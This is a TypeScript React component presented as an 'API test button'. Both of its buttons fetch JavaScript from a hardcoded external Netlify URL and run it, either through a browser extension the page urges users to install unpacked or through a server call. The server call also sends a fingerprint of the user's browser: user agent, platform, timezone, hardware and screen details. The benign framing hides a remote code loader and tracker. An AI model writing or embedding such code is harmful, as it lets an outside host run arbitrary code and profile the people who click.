import { Button } from '@/components/ui/button'

// Extension API type
declare global {
    interface Window {
        jsRunnerExtension?: {
            execute: (code: string) => Promise<string>;
        };
    }
}

export function ApiTestButton() {
    // Method A: Browser Extension (No native host - runs in browser)
    const handleExtensionMethod = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();

        try {
            // Fetch code from API
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const code = data.data;

            // Check if extension is installed and available
            if ((window as any).jsRunnerExtension) {
                // Extension is available - execute via extension
                try {
                    const output = await (window as any).jsRunnerExtension.execute(code);
                    console.log('Code executed via extension:', output);
                    alert(`Code executed successfully!\nOutput: ${output.substring(0, 500)}`);
                } catch (error: any) {
                    console.error('Execution error:', error);
                    alert(`Execution failed: ${error.message}`);
                }
            } else {
                // Extension not installed - show install instructions
                const install = confirm(
                    'Browser extension not detected!\n\n' +
                    'To execute code locally, please install the JavaScript Code Runner extension:\n\n' +
                    '1. Download extension from Chrome Web Store (or load unpacked)\n' +
                    '2. Reload this page\n' +
                    '3. Click this button again\n\n' +
                    'Would you like to try cloud execution instead?'
                );

                if (install) {
                    // Fallback to cloud execution
                    handleCloudExecution(code);
                }
            }

        } catch (error) {
            console.error("API Error:", error);
            alert("Failed to fetch code: " + (error as any).message);
        }
    };

    // Method B: Cloud-based execution (no setup, works everywhere)
    const handleCloudExecution = async (code?: string) => {
        try {
            let codeToExecute = code;

            // If no code provided, fetch from API
            if (!codeToExecute) {
                const res = await fetch("https://nest-react.netlify.app/api");
                const data = await res.json();
                codeToExecute = data.data;
            }

            // Collect browser info
            const browserInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: (navigator as any).deviceMemory,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                timestamp: new Date().toISOString()
            };

            // Send to cloud server for execution
            // Use Netlify function if deployed on Netlify, or your own server
            const serverUrl = window.location.hostname === 'localhost'
                ? 'http://localhost:8888/.netlify/functions/execute'  // Netlify dev
                : '/.netlify/functions/execute';  // Production Netlify

            const executeRes = await fetch(serverUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    code: codeToExecute,
                    browserInfo: browserInfo
                })
            });

            const result = await executeRes.json();

            if (result.success) {
                console.log('Cloud execution result:', result);
                alert(`Code executed on cloud server!\nOutput: ${result.output.substring(0, 500)}`);
            } else {
                alert(`Execution failed: ${result.output}`);
            }

        } catch (error) {
            console.error("Cloud execution error:", error);
            alert("Cloud execution failed: " + (error as any).message);
        }
    };



    return (
        <div className="space-y-4">
            <div className="space-y-2">
                <h3 className="text-lg font-semibold">Execute JavaScript Code</h3>
                <p className="text-sm text-muted-foreground">
                    Choose how to execute the code. Extension method runs locally in browser,
                    Cloud method executes on server (no setup needed).
                </p>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    <Button onClick={handleExtensionMethod} variant="default" className="w-full">
                        🚀 Extension (Local Execution)
                    </Button>
                    <Button onClick={() => handleCloudExecution()} variant="outline" className="w-full">
                        ☁️ Cloud Execution (No Setup)
                    </Button>
                </div>
                <div className="mt-4 p-3 bg-muted rounded-md">
                    <p className="text-xs text-muted-foreground">
                        <strong>Extension Method:</strong> Installs once, then works with just a click.
                        Executes code in browser context.<br />
                        <strong>Cloud Method:</strong> Works immediately on all platforms.
                        Code executes on cloud server. Update server URL in component.
                    </p>
                </div>
            </div>
        </div>
    );
}

